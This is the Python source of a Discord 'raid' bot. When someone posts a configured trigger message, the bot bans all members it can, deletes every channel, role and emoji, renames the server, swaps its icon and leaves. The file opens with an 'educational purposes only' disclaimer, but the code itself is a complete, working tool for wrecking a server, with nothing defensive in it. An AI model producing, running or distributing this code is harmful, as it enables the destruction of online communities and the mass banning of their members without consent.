import sys
from colorama import Fore , Style
print(Fore.GREEN + "\nDisclaimer:\n")
print(Fore.YELLOW + "This is for educational purposes only.")
print(Fore.YELLOW + "Use this only if you have the consent of the server owner.")
print(Fore.YELLOW + "I am not responsible for any damage done by this bot.\n")

r = input(Fore.CYAN+"Continue?? (Y/N): ").lower()
if r == "y":
    print("Initializing Bot...")
elif r == "n":
    print(Style.RESET_ALL)
    sys.exit(0)
else:
    print(Style.RESET_ALL)
    sys.exit(0)

import json
import discord

with open("config.json" , "r") as f:
    data = f.read()

data = json.loads(data)
token = data["TOKEN"]
trigger = data["TRIGGER"]
invite = data["INVITE_LINK"]
ban_msg = data["BAN_MESSAGE"]
intents = discord.Intents.default()
intents.members = True

client = discord.Client(intents=intents)
print("\n")
print(Style.RESET_ALL)
print(Fore.GREEN + f"[BOT] INVITE: {invite}")
print(Fore.YELLOW + f"BAN_MSG: {ban_msg}")
print(Fore.YELLOW + f"TRIGGER: {trigger}")

@client.event
async def on_ready():
    activity = discord.Activity(type=discord.ActivityType.streaming , name = trigger)
    await client.change_presence(status=discord.Status.do_not_disturb , activity=activity)
    print(Fore.GREEN + "[BOT] READY")
    print(Fore.GREEN + f"[BOT] LOGGED IN: {client.user}")
    
    


@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content == trigger:
        print(Fore.YELLOW + f"[BOT] RAID INIT FROM: {message.author}")
        print(Fore.RED + "[WARNING] RAIDING SERVER")
        print(Fore.GREEN + f"[BOT] SERVER: {message.guild.name}")
        print(Style.RESET_ALL)

        # Banning all members possible
        
        for x in message.guild.members:
            print(Fore.BLUE + f"[MEMBER] BANNING {x}")
            try:
                await x.ban(reason=ban_msg)
                print(Fore.GREEN + "SUCCESS")
            except Exception as e:
                print(Fore.RED + "FAILED")
        
        # Deleting all channels+categories possible
        
        for y in message.guild.channels:
            print(Fore.BLUE + f"[CHANNEL] DELETING {y}")
            try:
                await y.delete()
                print(Fore.GREEN + "SUCCESS")
            except Exception as e:
                print(Fore.RED + "FAILED")
        
        # Load Server Icon specified in config
        with open((img:=data["IMAGE_PATH"]) , "rb") as pic:
            logo = pic.read()
        
        # Delete all possible roles
        
        for z in message.guild.roles:
            print(Fore.BLUE + f"[ROLE] DELETING {z}")
            try:
                await z.delete()
                print(Fore.GREEN + "SUCCESS")
            except Exception as e:
                print(Fore.RED + "FAILED")
    
        # Delete Emojis
        for a in message.guild.emojis:
            print(Fore.BLUE + f"[EMOJI] DELETING {a}")
            try:
                await a.delete()
                print(Fore.GREEN + "SUCCESS")
            except Exception as e:
                print("FAILED")

            

        print(Fore.GREEN + f"[BOT] NEW NAME: " + (nn:=data["NEW_NAME"]))
        print(Fore.BLUE + f"[NAME] CHANGING SERVER NAME TO {nn}")
        try:
            await message.guild.edit(name=data["NEW_NAME"]) # Change Name icon=logo
            print(Fore.GREEN + "SUCCESS")
        except Exception as e:
            print(Fore.RED + "FAILED")
        print(Fore.BLUE + f"[ICON] CHANGIN SERVER ICON TO {img}")
        try:
            await message.guild.edit(icon=logo) # Change Name 
            print(Fore.GREEN + "SUCCESS")
        except Exception as e:
            print(Fore.RED + "FAILED")

        print(Fore.GREEN+f"[BOT] PROCESS COMPLETE")
        print(Fore.YELLOW + f"[BOT] LEAVING SERVER {message.guild.name}")
        try:
            await message.guild.leave()
            print(Fore.GREEN + "SUCCESS")
        except Exception as e:
            print(Fore.RED + "FAILED")


        print(Style.RESET_ALL)
client.run(token)
